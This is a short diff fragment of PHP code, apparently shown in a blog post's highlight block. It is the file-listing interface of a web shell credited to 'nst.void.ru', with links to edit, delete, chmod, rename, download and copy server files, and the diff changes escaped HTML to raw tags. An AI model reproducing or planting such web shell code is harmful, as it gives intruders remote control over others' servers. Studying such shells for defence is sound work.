+echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?d=$d&e=$files[$i]'>$files[$i]</a></td><td bgcolor=$color><center><a href=\"javascript:ShowOrHide('$i','')\">[options]</a><div id='$i' style='display:none;z-index:1;' ><a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'><b>Edit</b></a><br><a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'><b>Delete</b></a><br><a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'><b>CHMOD</b></a><br><a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'><b>Rename</b></a><br><a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'><b>Download</b></a><br><a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'><b>Copy</b></a></div></td><td bgcolor=$color>$siz</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
 }
 
-echo "&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;";
+echo "</table></td></tr></table>";
 echo $copyr;
 
 ?>
-&lt;!-- Network security team :: nst.void.ru --&gt;
+<!-- Network security team :: nst.void.ru -->
 {% endhighlight %}
